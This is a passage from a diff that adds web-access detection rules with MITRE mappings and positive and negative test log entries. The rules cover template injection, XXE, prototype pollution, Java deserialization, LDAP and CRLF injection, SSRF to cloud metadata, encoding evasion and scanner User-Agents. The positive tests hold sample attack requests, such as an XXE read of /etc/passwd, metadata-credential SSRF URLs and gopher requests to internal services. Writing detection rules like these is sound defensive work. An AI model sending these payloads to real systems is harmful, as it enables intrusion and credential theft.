+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/docs/ognl-basics",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=17 dec=0 target=/docs/ognl-basics"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/a",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=18 dec=0 target=/a?q=java language"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/a.action",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=14 dec=0 target=/a.action?id=5"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-exploit-ssti-probe",
+      "name": "Server-side template injection probe",
+      "description": "Arithmetic template expressions such as {{7*7}} or ${7*7}, Jinja2 config/request access, or Python class-walk attributes in a request value.",
+      "tactic": "Initial Access",
+      "technique": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "severity": "medium",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "command",
+            "op": "regex",
+            "pattern": "(?:\\{\\{\\s*(?:\\d{1,3}\\s*\\*\\s*\\d{1,3}|config|request)\\b[^}]{0,40}\\}\\}|\\$\\{\\s*\\d{1,3}\\s*\\*\\s*\\d{1,3}\\s*\\}|__class__|__mro__|__subclasses__|<%=\\s*\\d{1,3}\\s*\\*)"
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "ssti"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/greet",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=19 dec=0 target=/greet?name={{7*7}}"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/greet",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=18 dec=0 target=/greet?name=${7*7}"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/g",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=23 dec=0 target=/g?n={{config.items()}}"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/g",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=29 dec=0 target=/g?n={{''.__class__.__mro__}}"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/greet",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=20 dec=0 target=/greet?name={{name}}"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/price",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=17 dec=0 target=/price?v=${price}"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/docs/class-mro-notes",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=21 dec=0 target=/docs/class-mro-notes"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-exploit-xxe-entity",
+      "name": "XML external entity declaration in request",
+      "description": "A <!ENTITY declaration or inline DOCTYPE subset in the request is an XXE attempt.",
+      "tactic": "Initial Access",
+      "technique": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "severity": "high",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "command",
+            "op": "regex",
+            "pattern": "(?:<!entity\\b|<!doctype\\s+\\w+\\s*\\[)"
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "xxe"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/api",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=67 dec=0 target=/api?xml=<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/a",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=42 dec=0 target=/a?x=<!ENTITY % remote SYSTEM 'http://x/'>"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/docs/doctype-html",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=18 dec=0 target=/docs/doctype-html"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/a",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=11 dec=0 target=/a?x=<html>"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/entity/42",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=10 dec=0 target=/entity/42"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-exploit-prototype-pollution",
+      "name": "Prototype pollution key in parameter",
+      "description": "__proto__ or constructor.prototype used as a parameter name or path can poison JavaScript object prototypes server-side.",
+      "tactic": "Initial Access",
+      "technique": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "severity": "medium",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "command",
+            "op": "regex",
+            "pattern": "(?:__proto__\\s*(?:\\[|\\.|=)|constructor\\s*(?:\\.|\\[\\s*['\\\"]?)prototype)"
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "nodejs"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/api",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=26 dec=0 target=/api?__proto__[admin]=true"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/api",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=20 dec=0 target=/api?a.__proto__.x=1"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/api",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=34 dec=0 target=/api?constructor.prototype.admin=1"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/docs/prototype-chain",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=21 dec=0 target=/docs/prototype-chain"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/api",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=12 dec=0 target=/api?proto=1"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/api",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=20 dec=0 target=/api?constructor=abc"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-exploit-java-deserialization-marker",
+      "name": "Serialized Java object in request value",
+      "description": "A parameter value starting with rO0AB (base64 of the Java serialization magic bytes) suggests an object-deserialization exploit attempt.",
+      "tactic": "Initial Access",
+      "technique": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "severity": "medium",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "command",
+            "op": "regex",
+            "pattern": "[=/]rO0AB[A-Za-z0-9+/]{8}",
+            "case_sensitive": true
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "java",
+        "deserialization"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/invoke",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=53 dec=0 target=/invoke?data=rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/api/x/rO0ABXQAB2V4YW1wbGU",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=26 dec=0 target=/api/x/rO0ABXQAB2V4YW1wbGU"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/a",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=20 dec=0 target=/a?id=aro0abxyz12345"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/a",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=20 dec=0 target=/a?token=ABCro0ABdef"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/docs/ro0ab",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=11 dec=0 target=/docs/ro0ab"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-exploit-ldap-filter-injection",
+      "name": "LDAP filter injection",
+      "description": "A closing wildcard followed by a new filter group such as *)(uid=*)) or *)(|( alters an LDAP search filter.",
+      "tactic": "Initial Access",
+      "technique": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "severity": "medium",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "command",
+            "op": "regex",
+            "pattern": "\\*\\)\\s*\\(\\s*(?:\\||&|!|\\w{1,12}=)"
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "ldapi"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/login",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=30 dec=0 target=/login?user=*)(uid=*))(|(uid=*"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/s",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=24 dec=0 target=/s?q=*)(|(objectclass=*)"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/s",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=7 dec=0 target=/s?q=a*"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/s",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=11 dec=0 target=/s?q=(a)(b)"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/docs/ldap-filters",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=18 dec=0 target=/docs/ldap-filters"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-exploit-crlf-injection",
+      "name": "HTTP header or response splitting via CR/LF",
+      "description": "An encoded CR LF pair, or a LF followed by a header name, inside a request value is used to inject headers or split responses.",
+      "tactic": "Initial Access",
+      "technique": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "severity": "medium",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "command",
+            "op": "regex",
+            "pattern": "(?:<cr><lf>|<lf>\\s*(?:set-cookie|location|content-(?:type|length)|x-[a-z-]{2,20})\\s*:)"
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "crlf"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=1 len=40 dec=1 target=/r?u=a<cr><lf>Set-Cookie: x=1"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/",
+            "destination": "203.0.113.7",
+            "command": "status=302 bytes=1 len=40 dec=1 target=/r?u=a<lf>Location: http://x"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/r",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=6 dec=0 target=/r?u=a"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=1 len=30 dec=1 target=/r?u=line1<lf>line2"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/docs/crlf",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=10 dec=0 target=/docs/crlf"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-evasion-null-byte",
+      "name": "Null byte in request target",
+      "description": "A decoded NUL byte (%00) in the path or query is used to truncate file names and bypass extension checks.",
+      "tactic": "Defense Evasion",
+      "technique": "T1027",
+      "technique_name": "Obfuscated Files or Information",
+      "severity": "medium",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "command",
+            "op": "contains",
+            "pattern": "<nul>"
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "evasion"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=1 len=30 dec=1 target=/download?f=../etc/passwd<nul>.png"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/download",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=17 dec=0 target=/download?f=a.png"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/docs/nul-byte",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=14 dec=0 target=/docs/nul-byte"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/a",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=8 dec=0 target=/a?q=nul"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-evasion-multi-encoding",
+      "name": "Multiply percent-encoded attack characters",
+      "description": "The target needed two or more decode passes and contains traversal, quote, angle-bracket or separator characters: double encoding is used to slip past single-pass filters.",
+      "tactic": "Defense Evasion",
+      "technique": "T1027",
+      "technique_name": "Obfuscated Files or Information",
+      "severity": "medium",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "command",
+            "op": "regex",
+            "pattern": "\\sdec=[23]\\s"
+          },
+          {
+            "field": "command",
+            "op": "contains",
+            "patterns": [
+              "../",
+              "..\\",
+              "<",
+              "'",
+              ";",
+              "|"
+            ]
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "evasion"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=1 len=60 dec=2 target=/a?f=../../etc/hosts"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=1 len=60 dec=2 target=/a?q=<img>"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=1 len=60 dec=2 target=/a?q=hello world"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=1 len=60 dec=1 target=/a?f=../../x"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/a",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=10 dec=0 target=/a?q=plain"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-evasion-oversize-request",
+      "name": "Oversized request target",
+      "description": "A request target of 2000 or more characters, typical of buffer-overflow and WAF-bypass padding probes (the log keeps the true length; the evidence keeps the first characters).",
+      "tactic": "Defense Evasion",
+      "technique": "T1027",
+      "technique_name": "Obfuscated Files or Information",
+      "severity": "low",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "command",
+            "op": "regex",
+            "pattern": "\\slen=(?:[2-9]\\d{3}|\\d{5,})\\s"
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "evasion"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/",
+            "destination": "203.0.113.7",
+            "command": "status=414 bytes=1 len=4096 dec=0 target=/a?x=AAAA"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/",
+            "destination": "203.0.113.7",
+            "command": "status=400 bytes=1 len=12000 dec=0 target=/a?x=BBBB"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=1 len=1999 dec=0 target=/a?x=ok"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/a",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=6 dec=0 target=/a?x=1"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=1 len=300 dec=0 target=/a"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-ssrf-cloud-metadata",
+      "name": "Request targets a cloud instance metadata service",
+      "description": "A request value names 169.254.169.254, metadata.google.internal or a /latest/meta-data/ path: a server-side request forgery attempt to steal instance credentials.",
+      "tactic": "Credential Access",
+      "technique": "T1552.005",
+      "technique_name": "Unsecured Credentials: Cloud Instance Metadata API",
+      "severity": "high",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "command",
+            "op": "regex",
+            "pattern": "(?:169\\.254\\.169\\.254|metadata\\.google\\.internal|100\\.100\\.100\\.200|/latest/meta-data(?:/|$|\\s)|/computemetadata/v1)"
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "ssrf",
+        "cloud"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/fetch",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=76 dec=0 target=/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/proxy",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=60 dec=0 target=/proxy?u=http://metadata.google.internal/computeMetadata/v1/"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/docs/aws/latest/meta-data-tags",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=31 dec=0 target=/docs/aws/latest/meta-data-tags"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/fetch",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=30 dec=0 target=/fetch?url=http://example.org/"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/status",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=7 dec=0 target=/status"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-ssrf-uncommon-scheme",
+      "name": "Request value uses a gopher, dict, ldap or tftp URL",
+      "description": "Non-HTTP URL schemes in a parameter are used to turn SSRF into raw protocol requests against internal services.",
+      "tactic": "Initial Access",
+      "technique": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "severity": "medium",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "command",
+            "op": "regex",
+            "pattern": "(?:\\bgopher|\\bdict|\\bldap|\\btftp)://"
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "ssrf"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/fetch",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=40 dec=0 target=/fetch?url=gopher://127.0.0.1:6379/_INFO"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/fetch",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=38 dec=0 target=/fetch?url=dict://127.0.0.1:11211/stat"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/docs/dictionary://not-a-url",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=28 dec=0 target=/docs/dictionary://not-a-url"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/fetch",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=35 dec=0 target=/fetch?url=https://example.org/ldap"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/a",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=11 dec=0 target=/a?q=gopher"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-scanner-ua-attack-tool",
+      "name": "Known attack or scanning tool User-Agent",
+      "description": "The User-Agent names a well-known vulnerability scanner, injection tool or fuzzer (sqlmap, Nikto, Nuclei, wpscan, ffuf, gobuster, ...). Authorised scans will also match; tune with an exception.",
+      "tactic": "Reconnaissance",
+      "technique": "T1595.002",
+      "technique_name": "Active Scanning: Vulnerability Scanning",
+      "severity": "medium",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "parent_exe",
+            "op": "contains",
+            "patterns": [
+              "sqlmap",
+              "nikto",
+              "nessus",
+              "acunetix",
+              "netsparker",
+              "w3af",
+              "openvas",
+              "wpscan",
+              "havij",
+              "arachni",
+              "appscan",
+              "zgrab",
+              "masscan",
+              "nmap scripting",
+              "nuclei",
+              "dirbuster",
+              "gobuster",
+              "feroxbuster",
+              "ffuf",
+              "wfuzz",
+              "jaeles",
+              "commix",
+              "xsser",
+              "skipfish",
+              "whatweb",
